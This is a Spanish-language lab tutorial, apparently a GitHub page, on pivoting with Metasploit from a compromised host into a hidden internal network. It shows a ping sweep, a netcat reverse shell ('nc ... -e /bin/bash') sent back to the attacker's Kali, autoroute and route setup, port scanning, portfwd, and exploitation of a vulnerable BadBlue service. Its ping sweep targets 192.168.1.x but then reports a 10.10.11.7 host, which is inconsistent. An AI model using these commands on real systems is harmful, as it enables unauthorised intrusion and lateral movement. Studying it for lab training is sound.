<h1 align="center">PIVOTING CON METASPLOIT</h1>

# **CONTEXTO**

Tenemos 3 máquinas, nuestro kali, máquina 1 y máquina 2 (no visible). Es una técnica de post explotación que sirve para poder identificar a equipos dentro de la red interna privada de la máquina victima.

# **EXPLOTACIÓN**

Cuando vulneramos la máquina 1 sin el uso de metasploit solo podemos saber las diferentes interfaces que tiene a través del comando ip a:

![image](https://github.com/user-attachments/assets/1d6f4476-8477-405b-bf56-77b44ff97e95)

Podemos ver que la máquina 1 tiene una segunda interfaz llamada enp0s8, ahora tenemos que descubrir qué equipos hay dentro de esa interfaz con un ping sweep (envía un ping a todos los equipos de esa red):

- `for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done`

![image](https://github.com/user-attachments/assets/7717f8f8-2b0e-410d-9457-daa8fd651ea3)

Ahora sabemos que hay otro equipo con la ip 10.10.11.7 que se encuentra dentro de esa red. Ahora para conseguir una sesión con meterpreter tenemos que ponernos a la escucha desde nuestro kali con multi/handler y mandar una shell desde la máquina 1 con netcat:

En nuestro Kali:

- `use multi/handler`

En la máquina 1:

- `nc *ip kali* *puerto multi/handler* -e /bin/bash`

Una vez que tenemos una sesión de meterpreter en la máquina 1, tenemos que habilitar el autoroute en la red desconocida desde meterpreter:

- `run autoroute -s *red_desconocida*/*máscara*`

(También podemos añadir una ruta de forma manual desde metasploit):

- `route add *red_desconocida*/*máscara* *sesion_máquina1*`

Con el comando route podemos ver las rutas que nos permiten ver las subredes a las que antes no teníamos acceso, ahora a través de la session 2 de la máquina 1 podemos ver los equipos que se encuentran dentro de la red desconocida:

![image](https://github.com/user-attachments/assets/b228287a-d0c5-4310-bfc2-1525c4930465)

Después buscamos el módulo de portscan para saber que puertos tiene abiertos la máquina 2 a la que no teníamos acceso.

- `search portscan/tcp`
- `set RHOSTS *ip_máquina2*`

Tras realizar el escaneo de puertos identificamos que la máquina 2 tiene el puerto 80 abierto, para poder ver el contenido del puerto 80 de la máquina 2 tenemos que utilizar la herramienta “portfwd” en meterpreter

- `portfwd add -l 1234 -p 80 -r *ip_equipo2*`

Ahora el puerto 80 de la máquina 2 pasa a ser el puerto 1234 de la máquina kali. Si hacemos un nmap del puerto 1234 del kali podemos ver la información del puerto 80 de la máquina 2. Al realizar el escaneo podemos ver que en el puerto 80 de la máquina 2 está el servicio badblue que es vulnerable. Buscamos en meterpreter badblue y rellenamos los campos y maquina 2 vulnerada.
